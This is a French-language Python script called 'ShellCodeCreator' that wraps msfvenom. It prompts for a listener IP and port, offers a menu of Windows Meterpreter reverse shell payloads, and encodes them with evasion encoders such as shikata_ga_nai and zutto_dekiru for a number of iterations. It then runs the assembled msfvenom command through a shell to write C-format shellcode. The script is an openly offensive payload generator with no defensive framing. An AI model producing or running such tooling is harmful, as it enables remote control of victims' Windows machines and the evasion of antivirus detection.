import socket,subprocess
print("Bienvenue !")
print("Ce logiciel a besoin de msfvenom pour fonctionner !")
print("             ____________________________________________________")
print("            /                                                    \\ ")
print("           |    _____________________________________________     |") 
print("           |   |                                             |    |")
print("           |   |  C:\\>               ShellCodeCreator        |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |                                             |    |")
print("           |   |_____________________________________________|    |")
print("           |                                                      |")
print("            \\_____________________________________________________/")
print("                   \\_______________________________________/")
print("                _______________________________________________")
print("             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_")
print("          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_")
print("       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_")
print("    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_")
print(" _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_")
print(":-----------------------------------------------------------------------------:")
print("`---._.-----------------------------------------------------------------._.---'")
ip = input("Votre ip : ")
port = input("Le port que vous voulez utiliser : ")
encodage = input("Le nombre d'itérations de votre shellcode (Si vous en mettez trop le payload rique de pas fonctionner) : ")
repertoire = input("Veuillez entrez le repertoire ( Exemple : D:\\Users\\Admin\\Desktop\\ ou /root/Bureau/ ) : ")
nom = input("Nom du shellcode : ")
print("Quel payload voulez vous utiliser ? :")
print("1 - windows/x64/meterpreter/reverse_https")
print("2 - windows/meterpreter/reverse_tcp")
print("3 - windows/x64/meterpreter/reverse_tcp")
print("4 - windows/meterpreter/reverse_https")
print("5 - windows/x64/meterpreter/reverse_tcp_dns")
print("6 - windows/meterpreter/reverse_tcp_dns")
print("7 - Autre , entrez votre payload")
print("Appuyez sur entrer pour le payload par default")
réponse = input("Quel est votre choix : ")

if réponse == "1":
	payload = "windows/x64/meterpreter/reverse_https"
	encodeur = "x64/zutto_dekiru"
elif réponse == "2":
	payload = "windows/meterpreter/reverse_tcp"
	encodeur = "x86/shikata_ga_nai"
elif réponse == "3":
	payload = "windows/x64/meterpreter/reverse_tcp"
	encodeur = "x64/zutto_dekiru"
elif réponse == "4":
	payload = "windows/meterpreter/reverse_https"
	encodeur = "x86/shikata_ga_nai"
elif réponse == "5":
	payload = "windows/x64/meterpreter/reverse_tcp_dns"
	encodeur = "x64/zutto_dekiru"
elif réponse == "6":
	payload = "windows/meterpreter/reverse_tcp_dns"
	encodeur = "x86/shikata_ga_nai"
elif réponse == "7":
	payload = input("Veuillez entrer votre payload ici : ")
	encodeur = input ("Veuillez entrer votre encodeur ici : (Exemple : x64/zutto_dekiru) : ")
elif réponse == "":
	payload = "windows/x64/meterpreter/reverse_https"
	encodeur = "x64/zutto_dekiru"


print("Création du shellcode en cours ...")
commande = subprocess.Popen(("msfvenom --platform windows -p "+payload+" LHOST="+ip+" LPORT="+port+" -i "+encodage+" -e "+encodeur+" -f c -o "+repertoire+nom),shell=True,stdout=subprocess.PIPE)
out = commande.communicate()
print(out)
